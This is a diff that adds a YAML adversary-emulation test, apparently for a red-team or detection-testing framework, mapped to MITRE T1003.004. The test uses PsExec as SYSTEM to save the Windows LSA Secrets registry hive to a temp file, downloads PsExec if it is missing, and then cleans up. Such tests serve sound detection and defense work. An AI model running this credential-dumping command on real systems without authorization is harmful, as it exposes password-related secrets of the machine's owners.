@@ -1,0 +1,37 @@
+api_version: "2.0"
+name: Dumping LSA Secrets
+description: |
+    Dump secrets key from Windows registry
+    When successful, the dumped file will be written to $env:Temp\secrets.
+    Attackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.
+    https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.
+args:
+    - name: psexec_exe
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1003.004\bin\PsExec.exe
+uuid: 55295ab0-a703-433b-9ca4-ae13807de12f
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.004: LSA Secrets'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})
+      inline: |-
+        if (Test-Path "#{psexec_exe}") {exit 0} else {{Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip"
+        Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PSTools" -Force
+        New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
+        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe" "#{psexec_exe}" -Force}}
+      executor: powershell
+    - name: dumping-lsa-secrets
+      inline: |
+        "{{.Args.psexec_exe}}" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
+      executor: command_prompt
+      cleanup:
+        inline: del %temp%\secrets >nul 2> nul
+        executor: command_prompt
